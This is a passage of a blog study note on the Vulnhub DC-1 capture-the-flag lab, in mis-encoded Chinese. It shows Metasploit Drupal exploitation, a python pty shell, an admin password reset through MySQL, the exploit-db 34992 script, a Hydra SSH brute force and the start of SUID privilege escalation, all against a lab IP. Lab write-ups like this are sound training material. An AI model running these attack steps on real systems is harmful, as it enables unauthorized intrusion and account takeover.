src="https://pic3.zhimg.com/80/v2-e5df9c9a913de7d44387d4c2b3d00472_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://picx.zhimg.com/80/v2-9c3a89ea03680304931488372d908bcd_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pica.zhimg.com/80/v2-1afbaf55afe9662ec475664384f14403_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://picx.zhimg.com/80/v2-53fd4aa98586e32c56c20d5f3b6a06d5_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-aee64d3f967e8c33ec5b49401bae2ade_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://picx.zhimg.com/80/v2-c7dfefd2eea3dcef90ef7ee9ad6dd4d3_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pic1.zhimg.com/80/v2-d0006553decea872cd9e63bf0d97e810_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://picx.zhimg.com/80/v2-9f8b7b5e3dd5d64b592823edb34689f8_1440w.jpg?source=1940ef5c" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> loveâ¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> loveâ¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubé¶åœºå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/08/29/vulnhub/"/>
      <url>/2022/08/29/vulnhub/</url>
      
        <content type="html"><![CDATA[<p><u><code>å­¦ä¹ ä¸€ä¸‹å®æˆ˜é¶åœºï¼Œåšä¸€ä¸‹ç¬”è®°</code></u></p><p><code>å®æˆ˜ç¯å¢ƒï¼Œ</code></p><p><code>ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›å†³å®šäº†èƒ½å¦æ¸—é€æˆåŠŸï¼Œä»¥åŠè‡ªå·±ä¼šæµªè´¹è‡ªå·±å¤šå°‘æ—¶é—´</code></p><span id="more"></span><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å®˜ç½‘ä¸‹è½½åœ°å€</p><blockquote><p><a href="http://www.vulnhub.com/">http://www.vulnhub.com/</a></p></blockquote><p>è¿™é‡Œæä¸€ä¸‹é¶åœºæœº<code>ip</code>æ€ä¹ˆçœ‹</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></p><blockquote><p><code>nmap -sP  192.168.133.134/24</code><br>&#x2F;&#x2F;192.168.133.134æ˜¯è™šæ‹Ÿæœºip</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p><p>æ‰¾åˆ°é¶æœº<code>ip</code></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure><p>ä¹ æƒ¯æ€§ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹å®ƒç«¯å£</p><p><img src="/2022/08/29/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p><hr><h1 id="DCç³»åˆ—ã€1-9ã€‘-å®Œ"><a href="#DCç³»åˆ—ã€1-9ã€‘-å®Œ" class="headerlink" title="DCç³»åˆ—ã€1~9ã€‘(å®Œ)"></a>DCç³»åˆ—ã€1~9ã€‘(å®Œ)</h1><h1 id="ä¸€ã€DC-1-åˆçº§"><a href="#ä¸€ã€DC-1-åˆçº§" class="headerlink" title="ä¸€ã€DC-1[åˆçº§]"></a>ä¸€ã€DC-1[åˆçº§]</h1><p><strong>five flags</strong></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æµè§ˆå™¨è®¿é—®é¶æœº<code>ip</code></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å¼€å§‹ç•Œé¢</p><p><img src="/2022/08/29/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></p><p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæ’ä»¶<code>Wappalyzer</code>ï¼Œå®ƒèƒ½å¤Ÿè·å–ç½‘é¡µè‡ªèº«çš„æ¡†æ¶å’Œç¼–å†™çš„è¯­è¨€ï¼Œè¿™æ ·å°±ä¸ç”¨æŸ¥çœ‹ç½‘ç»œè¿”å›åŒ…æ¥åˆ†æäº†</p><p><img src="/2022/08/29/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></p><p>å¯ä»¥çœ‹åˆ°ç½‘ç«™æ˜¯ç”¨<code>php</code>è¯­è¨€ç¼–å†™çš„ï¼Œ<code>CMS</code>æ˜¯<code>Drupal</code></p><hr><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>å…ˆç”¨<code>msf</code>çœ‹çœ‹æœ‰æ²¡æœ‰<code>drupal</code>ç›¸åº”çš„æ”»å‡»è„šæœ¬</p><blockquote><p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥<code>msf</code>ç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></p><blockquote><p>è¾“å…¥<code>search drupal</code>ï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬<br><em>å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢</em></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></p><p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p><blockquote><p>è¾“å…¥<code>use 1</code>ï¼Œè¿›å…¥ç¼–å·1è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></p><blockquote><p>è¾“å…¥<code>show options</code>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></p><blockquote><p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œ<code>yes</code>æ˜¯å¿…å¡«é¡¹ï¼Œ<code>no</code>æ˜¯éå¿…å¡«é¡¹</p></blockquote><p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p><blockquote><p>è¾“å…¥<code>set RHOSTS 192.168.133.136</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></p><blockquote><p>å†è¾“å…¥<code>run</code>ï¼Œè¿è¡Œè„šæœ¬</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></p><blockquote><p>è¾“å…¥<code>shell</code>ï¼Œè¿›å…¥<code>shell</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></p><blockquote><p>è¾“å…¥<code>whoami</code>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></p><p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p><blockquote><p>è¾“å…¥<code>ls</code>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></p><p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p><h3 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="*äº¤äº’å¼shell"></a><code>*äº¤äº’å¼shell</code></h3><p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></p><blockquote><p>è¾“å…¥<code>ls</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p><p>å‘ç°<code>flag1.txt</code></p><blockquote><p>è¾“å…¥<code>cat flag1.txt</code>æŸ¥çœ‹</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></p><blockquote><p><code>Every good CMS needs a config file - and so do you.</code><br>æ„æ€æ˜¯ï¼šä¸€ä¸ªå¥½çš„CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰éœ€è¦ä¸€ä¸ªconfig fileï¼ˆé…ç½®æ–‡ä»¶ï¼‰</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çœ‹çœ‹å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯Flag2çš„çº¿ç´¢</p></blockquote><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>åœ¨ç›®å½•ä¸‹æˆ‘ä»¬å‘ç°æœ‰ä¸ª<code>sites</code>ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç«™ç‚¹ç›®å½•ï¼Œé‡Œé¢å¾ˆæœ‰å¯èƒ½æœ‰é…ç½®æ–‡ä»¶</p><p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p><blockquote><p>è¾“å…¥<code>cd sites;ls -a</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></p><p>æœ‰ä¸ª<code>default</code>ï¼ˆé»˜è®¤ï¼‰ç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><blockquote><p>è¾“å…¥<code>cd default;ls -a</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></p><p>çœ‹åˆ°<code>setting.php</code>ä¹Ÿå°±å·®ä¸å¤šæ˜¯<code>config file</code></p><blockquote><p>è¾“å…¥<code>cat setting.php</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></p><p>å¾—åˆ°<code>Flag2</code></p><blockquote><ul><li><p><code>flag2</code></p></li><li><p><code>Brute force and dictionary attacks aren&#39;t the</code></p></li><li><p><code>only ways to gain access (and you WILL need access).</code></p></li><li><p><code>What can you do with these credentials?</code></p><p> æ„æ€æ˜¯ï¼šæš´åŠ›å’Œå­—å…¸æ”»å‡»ä¸æ˜¯è·å¾—è®¿é—®æƒé™çš„å”¯ä¸€æ–¹æ³•ï¼ˆæ‚¨å°†éœ€è¦è®¿é—®æƒé™ï¼‰ã€‚<br> ä½ èƒ½ç”¨è¿™äº›è¯ä¹¦åšä»€ä¹ˆï¼Ÿ</p></li></ul><p>å°±æ˜¯è¯´ä¸è¦å±€é™äºçˆ†ç ´å¯†ç æ¥ç™»å½•adminç”¨æˆ·ï¼Œä½ æ‹¥æœ‰äº†æ•°æ®åº“è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥åšä»€ä¹ˆ</p></blockquote><hr><h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>å…³é”®åˆ†æè¿™é‡Œï¼Œè¿™æ˜¯é¶æœºæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç çš„ä¿¡æ¯ï¼Œ</p><p>æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è¿›å…¥é¶æœºçš„æ•°æ®åº“ï¼Œå¯¹é‡Œé¢çš„æ•°æ®åº“è¿›è¡Œä¿®æ”¹æˆ–å¢æ·»</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   )</span><br></pre></td></tr></table></figure><h3 id="1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰"><a href="#1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰" class="headerlink" title="1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰"></a>1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰</h3><blockquote><p>è¾“å…¥<code>mysql -udbuser -pR0ck3t</code></p><p>*æ³¨æ„è¿™é‡Œ-uå’Œ-påé¢æ²¡æœ‰ç©ºæ ¼ï¼Œæœ‰ç©ºæ ¼ä¼šæŠ¥é”™</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></p><p>å…ˆçœ‹çœ‹æ•°æ®åº“</p><blockquote><p>è¾“å…¥<code>show databases;</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></p><p>æŸ¥çœ‹<code>drupaldb</code>åº“é‡Œçš„è¡¨</p><blockquote><p>è¾“å…¥<code>use drupaldb;</code><br>ç„¶åè¾“å…¥<code>show tables;</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></p><p>çœ‹åˆ°<code>users</code>è¡¨ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ç™»å½•æˆåŠŸçš„å…³é”®ï¼ŒæŸ¥çœ‹è¯¥è¡¨</p><p><img src="/2022/08/29/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></p><p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¿®æ”¹æˆ–è€…è·å¾—adminç”¨æˆ·çš„å¯†ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å†åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯éƒ½éœ€è¦åŠ å¯†</p><blockquote><p>å› ä¸ºè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°ç”¨æˆ·çš„å¯†ç æ˜¯è¢«åŠ å¯†äº†çš„ï¼Œé‚£åŠ å¯†æ–‡ä»¶è‚¯å®šæ˜¯åœ¨è„šæœ¬ç›®å½•é‡Œï¼Œä¹Ÿå°±æ˜¯scriptsç›®å½•é‡Œï¼Œåˆ©ç”¨åŠ å¯†è„šæœ¬ï¼ŒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œç„¶åæ›´æ–°æ•°æ®åº“é‡Œadminç”¨æˆ·åŸæœ¬çš„å¯†ç </p></blockquote><p>æˆ‘ä»¬æ¥æ‰¾æ‰¾å¯†ç åŠ å¯†è„šæœ¬åœ¨å“ªé‡Œ</p><p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p><p>çœ‹åˆ°<code>scripts</code>ç›®å½•</p><p>è¿›å…¥æŸ¥çœ‹</p><blockquote><p>è¾“å…¥<code>cd scripts;ls -a</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></p><p>å‘ç°æœ‰ä¸€ä¸ª<code>password-hash.sh</code>æ–‡ä»¶ï¼Œå¯†ç å°±æ˜¯é€šè¿‡å®ƒè¿›è¡ŒhashåŠ å¯†çš„</p><p>è¿è¡Œå®ƒï¼Œè®©å®ƒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†</p><blockquote><p>è¾“å…¥<code>./password-hash.sh  123456</code></p></blockquote><hr><p>ä½†æ˜¯è¿è¡Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œå¦‚æœæ²¡æœ‰è¯·å¿½ç•¥</p><p><img src="/2022/08/29/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></p><p>æŠ¥é”™è¯´</p><blockquote><p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p></blockquote><p>ä¹Ÿå°±æ˜¯æ‰¾ä¸åˆ°è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°ï¼Œincludesç›®å½•ç¡®å®ä¹Ÿä¸åœ¨scriptsç›®å½•ä¸‹ï¼Œäºæ˜¯ç”¨cpæŠŠ<code>includes</code>ç›®å½•æ”¾åˆ°<code>scripts</code>ç›®å½•ä¸‹å³å¯</p><blockquote><p>è¾“å…¥<code>cp -r ../includes ./</code></p></blockquote><hr><p>å¾—åˆ°åŠ å¯†æ•°æ®</p><p><img src="/2022/08/29/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></p><p>å†æ¬¡è¿›å…¥<code>mysql</code>æ•°æ®åº“ï¼Œä¿®æ”¹ <code>admin</code>å¯†ç </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></p><p>æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½ç™»å½•</p><blockquote><p>ç”¨æˆ·åï¼š<code>admin</code></p><p>å¯†ç ï¼š<code>123456</code></p></blockquote><p>ç™»å½•æˆåŠŸ</p><p><img src="/2022/08/29/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></p><p>å¾—åˆ°flag3</p><p><img src="/2022/08/29/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></p><h3 id="2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·"><a href="#2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·" class="headerlink" title="2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·"></a>2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</h3><p>ä¼˜ç‚¹æ˜¯æ›´åŠ æ–¹ä¾¿ï¼Œå¿«æ·ï¼Œ<strong>ä½†æ˜¯è„šæœ¬ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œåªæœ‰è‡ªå·±æ˜ç™½åŸç†æ‰æ˜¯çœŸæ­£æŒæ¡</strong>ï¼Œè¿™ä¸ªçš„æœ¬è´¨ä¹Ÿæ˜¯åˆ©ç”¨<code>sql</code>æ³¨å…¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure><p>è¯¥ç½‘ç«™åœ¨kalié‡Œé¢æµè§ˆå™¨ä¹¦ç­¾è‡ªå¸¦çš„ï¼Œè¿™ä¸ªè„šæœ¬é€‚ç”¨äºdrupalï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥ç”¨å³å¯</p><p><img src="/2022/08/29/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></p><p>ä¸‹è½½å¥½åï¼Œè¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python2</span> <span class="number">34992</span>.py -t http://<span class="number">192.168.133.136</span> -u admin001 -p <span class="number">123456</span></span><br></pre></td></tr></table></figure><blockquote><p>-tå°±æ˜¯ç›®æ ‡ç½‘ç«™ï¼Œ-uå°±æ˜¯æ–°å»ºçš„ç”¨æˆ·åï¼Œ-på°±æ˜¯ç”¨æˆ·åå¯†ç <br>*æ³¨æ„è¿™ä¸ªè„šæœ¬éœ€è¦ python2è¿è¡Œï¼Œpython3è¯­æ³•ä¸ç¬¦åˆ</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></p><p>ç„¶åæŒ‰ç…§è¾“å…¥çš„ï¼Œç›´æ¥ç™»å½•å°±å¯ä»¥äº†ï¼Œæˆ–è€…ç›´æ¥ç‚¹å‡»ä¸‹é¢é“¾æ¥</p><p><img src="/2022/08/29/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></p><p>å°±å¯ä»¥æ‹¿åˆ°<code>Flag3</code></p><p><img src="/2022/08/29/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></p><hr><h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1ï¼‰ä¸ªäººæ–¹æ³•"><a href="#1ï¼‰ä¸ªäººæ–¹æ³•" class="headerlink" title="1ï¼‰ä¸ªäººæ–¹æ³•"></a>1ï¼‰ä¸ªäººæ–¹æ³•</h3><p>åˆ†æä¸€ä¸‹<code>flag3</code></p><blockquote><p><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code></p><p>æ„æ€æ˜¯ï¼šSpecial PERMSç‰¹åˆ«çš„æƒé™ï¼ˆåº”è¯¥æ˜¯rootæƒé™ï¼‰ï¼Œpasswdåº”è¯¥æ˜¯æŸ¥çœ‹&#x2F;etc&#x2F;passwdç›®å½•ï¼ŒFINDæ„æ€åˆ©ç”¨findå‘½ä»¤ï¼Œ-execå°±æ˜¯éœ€è¦ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ï¼Œ get whatâ€™s in the shadowæ„æ€æ˜¯flag4åœ¨&#x2F;etc&#x2F;shadowé‡Œ</p></blockquote><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>etc</code>ç›®å½•</p><p><img src="/2022/08/29/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></p><p>å‘ç°äº†<code>passwd</code>æ–‡ä»¶</p><blockquote><p>è¾“å…¥<code>cat passwd</code></p></blockquote><p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p><p>å‘ç°æœ‰<code>flag4</code>çš„çº¿ç´¢</p><p><img src="/2022/08/29/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></p><p><code>flag4</code>æ˜¯åœ¨<code>/home/flag4</code>é‡Œé¢ï¼Œæˆ‘ä»¬åˆ°ç›®å½•é‡Œçœ‹çœ‹</p><blockquote><p>è¾“å…¥<code>cd /home/flag4</code></p></blockquote><p>å‘ç°æœ‰ä¸ª<code>flag4.txt</code>ï¼ŒæŸ¥çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p><p>å¾—åˆ°<code>flag4</code></p><h3 id="2ï¼‰å®˜æ–¹æ–¹æ³•"><a href="#2ï¼‰å®˜æ–¹æ–¹æ³•" class="headerlink" title="2ï¼‰å®˜æ–¹æ–¹æ³•"></a>2ï¼‰å®˜æ–¹æ–¹æ³•</h3><p>ç”¨äº†<code>hydra</code>[ä¹å¤´è›‡]å·¥å…·ï¼Œå¯¹æˆ‘ä»¬åœ¨<code>passwd</code>é‡Œçœ‹åˆ°<code>flag4</code>ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br></pre></td></tr></table></figure><blockquote><p>-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-pæ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯<br>ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</p><p>ä¸Šé¢-pçš„æ–‡ä»¶æ˜¯è‡ªå·±ä¸‹è½½çš„å¯†ç åŒ…</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p><p>è¿™é‡Œå°±çœ‹åˆ°<code>flag4</code>ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯<code>orange</code></p><p>ç„¶åç”¨<code>ssh</code>è¿æ¥</p><blockquote><p>è¾“å…¥<code>ssh flag4@192.168.133.136</code><br>ç„¶åyes<br>ç„¶åè¾“å…¥å¯†ç ï¼š<code>orange</code></p></blockquote><p>è¿›å…¥<code>flag4</code>ç”¨æˆ·é¡µé¢ï¼Œ</p><blockquote><p>è¾“å…¥<code>cat flag4.txt</code><br>å¾—åˆ°flag4</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p><hr><h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><blockquote><p>åˆ†æä¸€ä¸‹flag5<br><code>Can you use this same method to find or access the flag in root?</code></p><p><code>Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></p><p>æ„æ€æ˜¯ï¼šæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æŸ¥æ‰¾æˆ–è®¿é—®æ ¹ç›®å½•ä¸­çš„æ ‡å¿—å—ï¼Ÿ</p><p>å¯èƒ½ä½†ä¹Ÿè®¸è¿™å¹¶ä¸å®¹æ˜“ã€‚ä¹Ÿè®¸æ˜¯è¿™æ ·ï¼Ÿ</p></blockquote><p><code>root</code>åº”è¯¥å°±æ˜¯éœ€è¦ææƒäº†</p><h3 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h3><p><code>linux</code>ææƒæ“ä½œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„<code>WEBéšç¬”</code>é‡Œ<code>suid</code>ææƒï¼Œä¸‹é¢åªè®°å½•æµç¨‹</p><blockquote><p>è¾“å…¥<code>find / -perm -u=s -type f 2&gt;/dev/null</code>ï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹suidæƒé™æ‰€æœ‰å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</p></blockquote><p>å‘ç°<code>find</code>ç›®å½•</p><p><img src="/2022/08/29/vulnhub/image-20220830162407934.png" 